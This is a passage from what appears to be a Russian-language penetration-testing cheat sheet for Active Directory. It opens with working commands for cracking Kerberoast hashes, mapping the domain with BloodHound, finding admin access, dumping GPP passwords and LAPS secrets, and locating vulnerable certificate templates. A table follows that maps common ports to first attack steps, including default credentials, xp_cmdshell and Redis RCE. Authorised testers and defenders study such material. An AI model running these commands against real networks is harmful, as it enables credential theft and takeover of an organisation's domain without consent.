CRED_USER="found_user"

# Крутим TGS хеши
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force

# BloodHound — собираем граф AD
bloodhound-ce-python -u "$CRED_USER" -p "$CRED_PASS" -d $DOMAIN -dc $DC_HOSTNAME.$DOMAIN -c all --zip -ns $DC_IP
# Или
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M bloodhound -o COLLECTION=all,OUTPUTPREFIX=bh

# Проверяем доступ к шарам
netexec smb smb_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" --shares 2>&1 | tee cred_shares.txt
grep "READ" cred_shares.txt

# Проверяем local admin access
netexec smb smb_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" 2>&1 | grep "Pwn3d"
netexec winrm winrm_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" 2>&1 | grep "Pwn3d"

# Дампим GPP-пароли (Group Policy Preferences)
impacket-Get-GPPPassword "$DOMAIN/$CRED_USER:$CRED_PASS@$DC_IP"
netexec smb $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M gpp_password
netexec smb $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M gpp_autologin

# Проверяем LAPS
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M laps

# Ищем ADCS (Active Directory Certificate Services)
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M adcs
certipy find -u "$CRED_USER@$DOMAIN" -p "$CRED_PASS" -dc-ip $DC_IP -vulnerable -stdout 2>&1 | tee certipy_output.txt

# Password spray с большей уверенностью (знаем политику)

## QUICK REFERENCE: ПОРТ → ДЕЙСТВИЕ

|Порт|Сервис|Первое действие|
|---|---|---|
|21|FTP|`ftp anonymous@IP` / `nmap --script ftp-anon`|
|22|SSH|Позже brute / banner grab для версии|
|25|SMTP|`smtp-user-enum -M VRFY -U users.txt -t IP`|
|53|DNS|`dig axfr @IP domain.local` (zone transfer)|
|80/443|HTTP|`whatweb`/`httpx`/`gowitness` → default creds|
|88|Kerberos|DC! → AS-REP Roast, kerbrute|
|111|RPC/NFS|`showmount -e IP` → mount shares|
|135|MSRPC|`rpcdump.py` / `IOXIDResolver.py` (найти скрытые интерфейсы)|
|139/445|SMB|null session → shares → signing → relay|
|389/636|LDAP|anon bind → users/descriptions|
|1433|MSSQL|`sa:sa` / `sa:` → `xp_cmdshell`|
|2049|NFS|`showmount -e IP` → `mount -t nfs IP:/share /mnt`|
|3306|MySQL|`root:` / `root:root`|
|3389|RDP|BlueKeep check, позже brute/spray|
|5432|PostgreSQL|`postgres:postgres`|
|5985|WinRM|evil-winrm с кредами|
|6379|Redis|`redis-cli -h IP INFO` → RCE через module|
|9200|Elasticsearch|`curl http://IP:9200/_cat/indices`|
